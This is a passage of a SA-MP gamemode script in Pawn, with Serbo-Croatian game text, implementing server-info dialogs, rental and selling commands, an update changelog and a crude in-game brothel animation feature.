	if( ServerInfo[ HappyHours ] != 0 ) format(srecnisati, 20, "ON(%dx)(%dlvl)", ServerInfo[HappyHours], ServerInfo[HappyHoursLvl]);
 	else format(srecnisati, 4, "Off");

	if( ServerInfo[ HappyJobs ] != 0 ) format(happyjobs, 15, "ON(%dx)", ServerInfo[HappyJobs]);
 	else format(happyjobs, 4, "Off");

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Ukupno logina na server: {4282C0}(%s)\n", fNumber(ServerInfo[ BrojPosetaServeru ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Ukupno registrovanih: {4282C0}(%s)\n", fNumber(ServerInfo[ RegistrovanihKorisnika ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Ukupno banovanih: {4282C0}(%s)\n", fNumber(ServerInfo[ BanovanihKorisnika ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Ukupno kikovanih: {4282C0}(%s)\n", fNumber(ServerInfo[ KikovanihKorisnika ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Ukupno warnova: {4282C0}(%s)\n", fNumber(ServerInfo[ BrojWarnova ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Srecni sati: {4282C0}%s\n", srecnisati );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Srecni poslovi: {4282C0}%s\n", happyjobs );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Pocetni level: {4282C0}(%d)\n", ServerInfo[ PocetniLevel ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Pocetni novac: {4282C0}($%s)\n", fNumber(ServerInfo[ PocetniNovaca ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Mogucnost kupovine vozila je {4282C0}%s\n", ((ServerInfo[KupovinaVozila]) ? ("ukljucena") : ("iskljucena")) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Mogucnost slanja pitanja je {4282C0}%s\n", ((ServerInfo[Pitanja]) ? ("ukljucena") : ("iskljucena")) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Mogucnost slanja reporta je {4282C0}%s\n", ((ServerInfo[Report]) ? ("ukljucena") : ("iskljucena")) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Trenutni broj kreiranih vozila je {4282C0}(%d)\n", ServerInfo[ BrojKreiranihVozila ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Mogucnost postavljanja oglasa je {4282C0}(%s)\n", ((ServerInfo[Oglasi]) ? ("ukljucena") : ("iskljucena")) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Rekord servera je {4282C0}(%s)\n", fNumber(ServerInfo[ RekordServera ]));
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{4282C0}> {FFFFFF}Novac u banci {4282C0}($%s)\n", fNumber(ServerInfo[ BankaNovac ]));
	strcat( DialogStrgEx, coordsstring );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    return 1;
}

CMD:unrentroom( playerid )
{
	if( PlayerInfo[ playerid ][ xRentID ] == -1 ) return SendErrorMessage( playerid, "Nisi rentao nijednu imovinu." );

    II[ PlayerInfo[ playerid ][ xRentID ] ][ iRentovano ]--;
    SaveProperty( PlayerInfo[ playerid ][ xRentID ] );

    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
    PlayerInfo[ playerid ][ xRentID ] = -1;

    new q[ 100 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `spawn` = '%d', `rent_id` = '-1'  WHERE `user_id` = '%d'",
										PlayerInfo[ playerid ][ xSpawn ],
										PlayerInfo[ playerid ][ xID ] );
	mysql_tquery( mSQL, q );

    SendInfoMessage( playerid, "Unrent si sobu u imovini koju si iznajmljivao." );
	return 1;
}

CMD:rentroom( playerid )
{
	if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
	if( II[ GetNearestProperty( playerid ) ][ iRentable ] == 0 ) return SendErrorMessage( playerid, "Ova imovina ne moze da se renta!" );
	if( II[ GetNearestProperty( playerid ) ][ iRentPrice ] == 0 ) return SendErrorMessage( playerid, "Ova imovina ne moze da se renta!" );
	if( PlayerInfo[ playerid ][ xNovac ] < II[ GetNearestProperty( playerid ) ][ iRentPrice ] ) return SendErrorMessage( playerid, "Nemas dovoljno novca($%d).", II[ GetNearestProperty( playerid ) ][ iRentPrice ] );
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Moras biti level 5+ da bi rentao.(AntiBug)" );

    PlayerInfo[ playerid ][ xRentID ] = GetNearestProperty( playerid );
    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_RENT;
	DajIgracuNovac( playerid, -II[ GetNearestProperty( playerid ) ][ iRentPrice ] );

	II[ GetNearestProperty( playerid ) ][ iRentovano ]++;
	II[ GetNearestProperty( playerid ) ][ iMoney ] += II[ GetNearestProperty( playerid ) ][ iRentPrice ];
	SaveProperty( GetNearestProperty( playerid ) );

	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `spawn` = '%d', `rent_id` = '%d'  WHERE `user_id` = '%d'",
										PlayerInfo[ playerid ][ xSpawn ],
										PlayerInfo[ playerid ][ xRentID ],
										PlayerInfo[ playerid ][ xID ] );

	mysql_tquery( mSQL, q );

	SendInfoMessage( playerid, "Uspesno si rentao ovu imovinu za {FFFFFF}($%d).", II[ GetNearestProperty( playerid ) ][ iRentPrice ] );
	return 1;
}

CMD:rentveh( playerid )
{
	if(GetNearestRentVehicle(playerid) == -1) return SendErrorMessage(playerid, "Niste u blizni nekog renta.");
	if(RentVozilo[playerid] != -1) return SendErrorMessage(playerid, "Vec imate rentano vozilo - (/unrent) - ukoliko ga zelite vratiti.");
	if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozete iz vozila.");

	ShowPlayerDialog(playerid, dialog_RENTANJE, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Rent Vozilo:",
																									"#\tModel\tCijena\n\
																									{4282C0}(1).\t{FFFFFF}Bike\t$500\n\
																									{4282C0}(2).\t{FFFFFF}Faggio\t$2000\n\
																									{4282C0}(3).\t{FFFFFF}Stallion\t$2500\n\
																									{4282C0}(4).\t{FFFFFF}Premier\t$3000\n\
																									{4282C0}(5).\t{FFFFFF}Sentinel\t$3500\n\
																									{4282C0}(6).\t{FFFFFF}Landstalker\t$4000\n\
																									{4282C0}(7).\t{FFFFFF}Super GT\t$4250\n\
																									{4282C0}(8).\t{FFFFFF}Buffalo\t$4500\n\
																									{4282C0}(9).\t{FFFFFF}Sultan\t$5000\n\
																									{4282C0}(10).\t{FFFFFF}Infernus\t$6000", "Rent", "Odustani");
    return 1;
}

CMD:prodajzlato( playerid, const params[] ) 
{
	if( !IsPlayerInRangeOfPoint(playerid, 3.0, 1707.7828, 1206.3898, 993.2150 ) ) return SendErrorMessage( playerid, "Morate biti u zlatari/diamond storu.");

	new kolicina;
	if( sscanf( params, "i", kolicina ) ) return SendUsageMessage( playerid, "/prodajzlato [kolicina]");
	if( kolicina < 0 || kolicina > 1000 ) return SendErrorMessage( playerid, "Ne mozete ispod 0 ili preko 1000 odjednom.");
	if( PlayerInfo[ playerid ][ xZlato ] < kolicina ) return SendErrorMessage( playerid, "Niste u mogucnosti prodati toliko grama zlata - nemate toliko.");

	DajIgracuNovac( playerid, kolicina*200 );
	PlayerInfo[ playerid ][ xZlato ] -= kolicina;
   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

	SendInfoMessage( playerid, "Uspesno ste prodali {FFFFFF}(%d) {4282C0}grama zlata te dobili {FFFFFF}($%d) {4282C0}novca.", kolicina, kolicina*200 );
	return 1;
}

CMD:bail(playerid)
{
	if(PlayerInfo[playerid][xZatvor] != JAIL) return SendErrorMessage(playerid, "Kauciju mozete koristiti samo ako ste u jailu, ne na slobodi ili prisonu.");
	if(PlayerInfo[playerid][xZatvorVreme] == 0) return SendErrorMessage(playerid, "Niste u zatvoru vise.");
	if(PlayerInfo[playerid][xZlato] < PlayerInfo[playerid][xZatvorVreme]*40) return SendErrorMessage(playerid, "Nemate dovoljno zlata za kauciju, potrebno vam je %dg.", PlayerInfo[playerid][xZatvorVreme]*40);

	new string[80];
	format(string, sizeof(string), "Zelite li platiti %dg zlata za izlazak iz zatvora?", PlayerInfo[playerid][xZatvorVreme]*40);
	ShowPlayerDialog(playerid, dialog_BAIL, DIALOG_STYLE_MSGBOX, "Bail", string, "Plati", "Odustani");
	return 1;
}

CMD:prodajdijamante(playerid, const params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1707.7828, 1206.3898, 993.2150 ) ) return SendErrorMessage( playerid, "Morate biti u zlatari/diamond storu.");

	new kolicina;
	if( sscanf( params, "i", kolicina ) ) return SendUsageMessage( playerid, "/prodajdijamante [kolicina]");
	if( kolicina < 0 || kolicina > 10 ) return SendErrorMessage( playerid, "Ne mozete ispod 0 ili preko 10 odjednom.");
	if( PlayerInfo[ playerid ][ xDiamond ] < kolicina ) return SendErrorMessage( playerid, "Niste u mogucnosti prodati toliko grama dijamanata - nemate toliko.");

	DajIgracuNovac( playerid, kolicina*100000 );
	PlayerInfo[ playerid ][ xDiamond ] -= kolicina;
   	sql_user_update_integer( playerid, "xDiamond", PlayerInfo[ playerid ][ xDiamond ] );

	SendInfoMessage( playerid, "Uspesno ste prodali {FFFFFF}(%d) {4282C0}grama dijamanata te dobili {FFFFFF}($%d) {4282C0}novca.", kolicina, kolicina*100000 );
	return 1;
}

CMD:update(playerid, const params[])
{
	if(sscanf(params, "i", params[0])) return SendUsageMessage(playerid, "/update [stranica(1/2)]");
	if(params[0] < 1 || params[0] > 2) return SendErrorMessage(playerid, "Pogresna stranica <1/2>.");

	switch(params[0])
	{
		case 1:
		{
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, 
																	"{4282C0}UPDATE 22.02.2020. (v1.4.0 - build 20)\n\
																	{4282C0}(1). {FFFFFF}Smanjen radius na labelima sa 25 na 10 metara\n\
																	{4282C0}(2). {FFFFFF}Ugasen zimski mod\n\
																	{4282C0}(3). {C14549}[in progress] {FFFFFF}Novi zadaci i misije (/zadaci)\n\
																	{4282C0}(4). {C14549}[in progress] {FFFFFF}Reworkovani pocetni zadaci\n\
																	{4282C0}(5). {C14549}[in progress] {FFFFFF}Sredeni svi ispisi brojeva, npr: 100000 u 100.000\n\
																	{4282C0}(6). {FFFFFF}Na odgvoru svakog pitanja automatski se postavlja Postovani/a\n\
																	{4282C0}(7). {FFFFFF}Komanda /pogledajodgovor prebacena u /podg\n\
																	{4282C0}(8). {C14549}[in progress] {FFFFFF}Skillovi poslova reworkovani (/posaoskillovi)\n\
																	{4282C0}(9). {C14549}[in progress] {FFFFFF}Optimizacija jednog djela moda\n\
																	{4282C0}(10). {FFFFFF}Dodane nove mogucnosti za torbu (/torba)\n\
																				\tMaterijali prebaceni u torbu;\n\
																				\tUzimanje broj metaka po zelji\n\
																	{4282C0}(11). {FFFFFF}Materijali maknuti iz igraceve statistike (/stats)\n\
																	{4282C0}(12). {FFFFFF}/bail promjenjen, izlazi dialog sa potvrdom kaucije\n\
																	{4282C0}(13). {FFFFFF}A/GM na duznosti ne moze primati pozive na mobitel\n\
																	{4282C0}(14). {FFFFFF}Promjenjena provjera igraca (/proveri)\n\
																	{4282C0}(15). {C14549}[in progress] {FFFFFF}Nova valuta servera - dijamant\n\
																	{4282C0}(16). {FFFFFF}Nova komanda za admine /pip\n\
																	{4282C0}(17). {FFFFFF}Sredene neke komande za A/GM/SA/P/VIP/YT\n\
																	{4282C0}(18). {FFFFFF}Izbacena droga i materijali iz crnog trzista\n\
																	{4282C0}(19). {FFFFFF}Skracenice za javljanje i prekidanje na telefon (/p & /h)\n\
																	{4282C0}(20). {FFFFFF}Povecan porez na imovinu i firmu\n\
																	{4282C0}(21). {FFFFFF}Ubaceno vise donatorskih boja (/dboja)\n\
																	{4282C0}(22). {FFFFFF}Kad netko uplati Bingo izbacuje text svim igracima\n\
																	{4282C0}(23). {FFFFFF}/rb /rrb /rrball od sada mogu A1+\n\
																	{4282C0}(24). {FFFFFF}Blokade se sada mogu rotirati/postaviti po zelji (/rb)\n\
																	{4282C0}(25). {FFFFFF}YouTuberima i Promoterima maknuta boja imena\n\
																	{4282C0}(26). {FFFFFF}\n\
																	{4282C0}(27). {FFFFFF}\n\
																	{4282C0}(28). {FFFFFF}\n\
																	{4282C0}(29). {FFFFFF}\n\
																	{4282C0}(30). {FFFFFF}\n\n\
																	{4282C0}\t>> [ Sljedeca stranica - /update 2 ]\n\
																	{4282C0}\t>> UPDATE by Saco x Ghetoven", "OK", "");
		}
		case 2:
		{
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, 
																	"{4282C0}UPDATE 22.02.2020. (v1.4.0 - build 20)\n\
																	{4282C0}(31). {FFFFFF}\n\
																	{4282C0}(32). {FFFFFF}\n\
																	{4282C0}(33). {FFFFFF}\n\
																	{4282C0}(34). {FFFFFF}\n\
																	{4282C0}(35). {FFFFFF}\n\
																	{4282C0}(36). {FFFFFF}\n\
																	{4282C0}(37). {FFFFFF}\n\
																	{4282C0}(38). {FFFFFF}\n\
																	{4282C0}(39). {FFFFFF}\n\
																	{4282C0}(40). {FFFFFF}\n\n\
																	{4282C0}\t>> [ Prethodna stranica - /update 1 ]\n\
																	{4282C0}\t>> [ Sljedeca stranica - /update 3 ]\n\
																	{4282C0}\t>> UPDATE by Saco x Ghetoven", "OK", "");
		}
		default: SendErrorMessage(playerid, "Pogresna stranica <1/2>.");
	}
	return 1;
}

_:public PusenjeKraj( playerid )
{
    if( PlayerInBlowJob[ playerid ] != 0 )
	{
        switch( PlayerInBlowJob[ playerid ] )
		{
			case 1:
			{
	            DestroyDynamicActor( Sex_Lisa );
	            WhoreLisa = false;
	            SMG_SetPlayerPos( playerid, -2436.8672, 992.8784, -20.5350  );
	        }
	        case 2:
			{
	            DestroyDynamicActor( Sex_Angelina );
	            WhoreAngelina = false;
	            SMG_SetPlayerPos( playerid, -2435.8345, 1008.8928, -20.5350 );
	        }
	        case 3:
			{
	            DestroyDynamicActor( Sex_Mia );
	            WhoreMia = false;
	            SMG_SetPlayerPos( playerid, -2448.1772, 1008.9288, -20.5350 );
	        }
	        case 4:
			{
	            DestroyDynamicActor( Sex_Sendy );
	            WhoreSendy = false;
	            SMG_SetPlayerPos( playerid, -2448.2437, 992.9090, -20.5350 );
	        }
		}
		StopAudioStreamForPlayer( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
        BlowJobCount[ playerid ] = 0;
    	SexTDControl( playerid, false );
	    TogPlayerHud( playerid );
	    SMG_TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	KillTimer(PusenjeTimer[playerid]);
	}
	return 1;
}

_:public SexTDControl( playerid, bool:show )
{
	if( show == true )
	{
		BLOWJOBCOVER[playerid][0] = CreatePlayerTextDraw(playerid, -15.007257, -9.499997, "box");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[playerid][0], 0.000000, 15.434844);
		PlayerTextDrawTextSize(playerid, BLOWJOBCOVER[playerid][0], 690.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[playerid][0], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, BLOWJOBCOVER[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, BLOWJOBCOVER[playerid][0], 255);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, BLOWJOBCOVER[playerid][0], 255);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, BLOWJOBCOVER[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][0], 0);

		BLOWJOBCOVER[playerid][1] = CreatePlayerTextDraw(playerid, -14.070215, 327.666625, "box");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[playerid][1], 0.000000, 15.434844);
		PlayerTextDrawTextSize(playerid, BLOWJOBCOVER[playerid][1], 690.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[playerid][1], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, BLOWJOBCOVER[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, BLOWJOBCOVER[playerid][1], 255);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, BLOWJOBCOVER[playerid][1], 255);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, BLOWJOBCOVER[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][1], 0);

		BLOWJOBCOVER[playerid][2] = CreatePlayerTextDraw(playerid, 640.248413, 120.766654, "time:_00");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[playerid][2], 0.224772, 1.209164);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[playerid][2], 3);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[playerid][2], -1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, BLOWJOBCOVER[playerid][2], 255);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[playerid][2], 2);
		PlayerTextDrawSetProportional(playerid, BLOWJOBCOVER[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][2], 0);

		BLOWJOBCOVER[playerid][3] = CreatePlayerTextDraw(playerid, 1.522459, 324.883331, "Da_zaustavite:_~r~(_/blowjob_)");
		PlayerTextDrawLetterSize(playerid, BLOWJOBCOVER[playerid][3], 0.182606, 1.010832);
		PlayerTextDrawAlignment(playerid, BLOWJOBCOVER[playerid][3], 1);
		PlayerTextDrawColor(playerid, BLOWJOBCOVER[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, BLOWJOBCOVER[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, BLOWJOBCOVER[playerid][3], 255);
		PlayerTextDrawFont(playerid, BLOWJOBCOVER[playerid][3], 2);
		PlayerTextDrawSetProportional(playerid, BLOWJOBCOVER[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, BLOWJOBCOVER[playerid][3], 0);

        for( new i = 0; i < 4; i ++)
		{
			PlayerTextDrawShow( playerid, BLOWJOBCOVER[ playerid ][ i ] );
		}
	}
	else if( show == false )
	{
		for( new i = 0; i < 4; i ++)
		{
			PlayerTextDrawHide( playerid, BLOWJOBCOVER[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, BLOWJOBCOVER[ playerid ][ i ] );
			BLOWJOBCOVER[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

CMD:blowjob( playerid )
{
	if( PlayerInBlowJob[ playerid ] != 0 )
	{
	    switch( PlayerInBlowJob[ playerid ] )
		{
	        case 1:
			{
	            DestroyDynamicActor( Sex_Lisa );
	            WhoreLisa = false;
	            SMG_SetPlayerPos( playerid, -2436.8672, 992.8784, -20.5350  );
	        }
	        case 2:
			{
	            DestroyDynamicActor( Sex_Angelina );
	            WhoreAngelina = false;
	            SMG_SetPlayerPos( playerid, -2435.8345, 1008.8928, -20.5350 );
	        }
	        case 3:
			{
	            DestroyDynamicActor( Sex_Mia );
	            WhoreMia = false;
	            SMG_SetPlayerPos( playerid, -2448.1772, 1008.9288, -20.5350 );
	        }
	        case 4:
			{
	            DestroyDynamicActor( Sex_Sendy );
	            WhoreSendy = false;
	            SMG_SetPlayerPos( playerid, -2448.2437, 992.9090, -20.5350 );
	        }

		}

		StopAudioStreamForPlayer( playerid );

	    BlowJobCount[ playerid ] = 0;
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
	    TogPlayerHud( playerid );
	    SMG_TogglePlayerControllable( playerid, ( true ) );
	    ClearAnimations( playerid );
	    KillTimer(PusenjeTimer[playerid]);
	}
	else
	{
	    if( IsPlayerInRangeOfPoint( playerid, 5.0, -2436.5886, 992.8784, -20.5350 ) )
		{
		    if( WhoreLisa == true ) return SendErrorMessage( playerid, "Kurva 'Lisa' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

            WhoreLisa = true;

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 1;

		    SMG_SetPlayerPos( playerid, -2436.5349, 990.3453, -19.8474 );
		    SetPlayerFacingAngle( playerid, 0.0 );

		    PlayAudioStreamForPlayer( playerid, "https://www.dropbox.com/s/dx8t6xg127fkere/Zyx%20-%20Blowjob%20Sound.mp3?dl=1" );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 30;
		    TogPlayerHud( playerid );

		    SMG_TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Lisa = CreateDynamicActor( 12, -2436.5349, 990.7470, -19.8474, 177.5185, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
			ApplyDynamicActorAnimation(Sex_Lisa, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0);

		    SetPlayerCameraPos( playerid, -2435.4030, 995.6231, -19.745 );
			SetPlayerCameraLookAt( playerid, -2436.6162, 990.7932, -20.193 );

			PusenjeTimer[ playerid ] = SetPlayerTimerEx(playerid, "PusenjeKraj", 30000, false, "i", playerid);
		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2436.6277, 1009.4991, -20.5350 ) )
		{
		    if( WhoreAngelina  == true ) return SendErrorMessage( playerid, "Kurva 'Angelina' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 2;

		    SMG_SetPlayerPos( playerid, -2436.7629, 1011.8691, -19.8474 );
		    SetPlayerFacingAngle( playerid, 180.0 );

		    PlayAudioStreamForPlayer( playerid, "https://www.dropbox.com/s/dx8t6xg127fkere/Zyx%20-%20Blowjob%20Sound.mp3?dl=1" );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 30;
		    TogPlayerHud( playerid );

		    SMG_TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

		    Sex_Angelina = CreateDynamicActor( 40, -2436.7629, 1011.2584, -19.8474, 359.8802, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
			ApplyDynamicActorAnimation(Sex_Angelina, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0);

		    SetPlayerCameraPos( playerid, -2436.689208, 1007.504333, -19.828128 );
			SetPlayerCameraLookAt( playerid, -2436.272460, 1012.462280, -20.323490 );

			PusenjeTimer[ playerid ] = SetPlayerTimerEx(playerid, "PusenjeKraj", 30000, false, "i", playerid);
		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2448.5032, 1009.4958, -20.5350 ) )
		{
		    if( WhoreMia  == true ) return SendErrorMessage( playerid, "Kurva 'Mia' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 3;

		    SMG_SetPlayerPos( playerid, -2448.7410, 1011.9281, -19.8474 );
		    SetPlayerFacingAngle( playerid, 180.0 );

		    PlayAudioStreamForPlayer( playerid, "https://www.dropbox.com/s/dx8t6xg127fkere/Zyx%20-%20Blowjob%20Sound.mp3?dl=1" );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 30;
		    TogPlayerHud( playerid );

		    SMG_TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

			Sex_Mia = CreateDynamicActor( 55, -2448.7410, 1011.2758, -19.8474, 358.3136, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
			ApplyDynamicActorAnimation(Sex_Mia, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0);

		    SetPlayerCameraPos( playerid, -2449.675537, 1006.677124, -19.653558 );
			SetPlayerCameraLookAt( playerid, -2448.498535, 1011.489257, -20.330032 );

			PusenjeTimer[ playerid ] = SetPlayerTimerEx(playerid, "PusenjeKraj", 30000, false, "i", playerid);
		}
		else if( IsPlayerInRangeOfPoint( playerid, 5.0, -2448.4248, 992.9086, -20.5350 ) )
		{
		    if( WhoreSendy == true ) return SendErrorMessage( playerid, "Kurva 'Sendy' je zauzeta idi do druge.");
		    if( PlayerInBlowJob[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ti pusi jedna kurva." );
		    if( PlayerInfo[ playerid ][ xNovac ] < 1500 ) return SendErrorMessage( playerid, "Nemas 1500$ u dzepu." );

		    DajIgracuNovac( playerid, -1500 );
		    BussinesJavnaKucaMoney( playerid, 750 );

		    PlayerInBlowJob[ playerid ] = 4;

		    SMG_SetPlayerPos( playerid, -2448.7410, 991.0281, -19.8474 );
		    SetPlayerFacingAngle( playerid, 0.0 );

		    PlayAudioStreamForPlayer( playerid, "https://www.dropbox.com/s/dx8t6xg127fkere/Zyx%20-%20Blowjob%20Sound.mp3?dl=1" );

		    ClearChat( playerid, 25 );

		    SexTDControl( playerid, true );
		    BlowJobCount[ playerid ] = 30;
		    TogPlayerHud( playerid );

		    SMG_TogglePlayerControllable( playerid, ( false ) );

		    ApplyAnimation( playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 1, 1, 1, 0 );

			Sex_Sendy = CreateDynamicActor( 64, -2448.7410, 991.5348, -19.8474, 180.0251, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
			ApplyDynamicActorAnimation(Sex_Sendy, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0);

		    SetPlayerCameraPos( playerid, -2449.843994, 995.880554, -19.543146 );
			SetPlayerCameraLookAt( playerid, -2448.617187, 991.092651, -20.298999 );

			PusenjeTimer[ playerid ] = SetPlayerTimerEx(playerid, "PusenjeKraj", 30000, false, "i", playerid);
		}
	}
	return 1;
}

CMD:selfie( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon!");
	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes dok si vezan." );
	if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );

	if( !takingselfie[ playerid ] )
	{
	    GetPlayerPos( playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ] );

		static Float: n1X, Float: n1Y;
